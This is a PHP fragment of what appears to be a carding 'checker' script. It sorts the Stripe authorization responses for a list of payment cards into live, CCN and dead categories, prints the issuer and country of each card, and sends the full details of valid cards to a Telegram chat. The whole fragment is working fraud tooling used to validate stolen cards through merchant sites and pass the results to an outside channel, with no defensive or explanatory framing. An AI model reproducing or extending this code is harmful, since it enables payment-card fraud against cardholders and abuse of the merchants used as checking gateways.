    echo '<span style="color: #ffffffff; padding: 8px;"> #CVV - [Card Added] - [AUTH STRIPE] - <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.' <br>
 
    <span style="color: #ff09b5ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';


      $telegramMessage = "💳 CARD: $lista [CARD ADDED✅] 
    \nℹ️ INFO: $cardBrand-$cardtype-$cardlevel
    \n🏦 ISSUER: $issuerName
    \n🌎 COUNTRY: $isoCountry
    \n🚧 GATEWAY: STRIPE AUTH - SITE#:$lineNumber\n";
    sendToTelegram($telegramMessage, $telegramToken, $chatId); 

} elseif (strpos($msg, "security code is incorrect") !== false) {
    echo '<span style="color: #ffffffff; padding: 8px;"> #CCN - [Your Security Code is Incorrect] - [AUTH STRIPE] - <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.' <br> 
   
    <span style="color: #ff09b5ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';

           $telegramMessage = "💳 CARD: $lista [ CCN: Your card security code is incorrect]
    \nℹ️ INFO: $cardBrand-$cardtype-$cardlevel
    \n🏦 ISSUER: $issuerName
    \n🌎 COUNTRY: $isoCountry
    \n🚧 GATEWAY: STRIPE AUTH - SITE#:$lineNumber\n";

} elseif (strpos($msg, "security code is invalid") !== false) {
    echo '<span style="color: #ffffffff; padding: 8px;"> #CCN - [Your Security Code is Incorrect] - [AUTH STRIPE] - <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.' <br>  
 
    <span style="color: #ff09b5ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';

           $telegramMessage = "💳 CARD: $lista [ CCN: Your card security code is incorrect] 
    \nℹ️ INFO: $cardBrand-$cardtype-$cardlevel
    \n🏦 ISSUER: $issuerName
    \n🌎 COUNTRY: $isoCountry
    \n🚧 GATEWAY: STRIPE AUTH - SITE#:$lineNumber\n";

} elseif (strpos($msg, "security code is incomplete") !== false) {
    echo '<span style="color: #ffffffff; padding: 8px;"> #CCN - [Your Security Code is Incorrect] - [AUTH STRIPE] - <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.' <br>  
   
    <span style="color: #ff09b5ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';

           $telegramMessage = "💳 CARD: $lista [ CCN: Your card security code is incorrect]
    \nℹ️ INFO: $cardBrand-$cardtype-$cardlevel
    \n🏦 ISSUER: $issuerName
    \n🌎 COUNTRY: $isoCountry
    \n🚧 GATEWAY: STRIPE AUTH - SITE#:$lineNumber\n";

} elseif (strpos($msg, "Your card has insufficient funds.") !== false) {
    echo '<span style="color: #ffffffff; padding: 8px;"> #CVV - [Your Card Has Insufficient Funds] - [AUTH STRIPE] - <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.' <br>  
  
    <span style="color: #ff09b5ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';


                $telegramMessage = "💳 CARD: $lista [ CVV: Your card has insufficient funds] 
    \nℹ️ INFO: $cardBrand-$cardtype-$cardlevel
    \n🏦 ISSUER: $issuerName
    \n🌎 COUNTRY: $isoCountry
    \n🚧 GATEWAY: STRIPE AUTH - SITE#:$lineNumber\n";

} else {
    echo '<span style="color: #ffffffff; padding: 8px;"> #DEAD  - ['.$msg.'] - <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.' <br>
    
    <span style="color: #ff09b5ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
}


curl_close($ch);
ob_flush();
unlink($cookies);
exit();

?>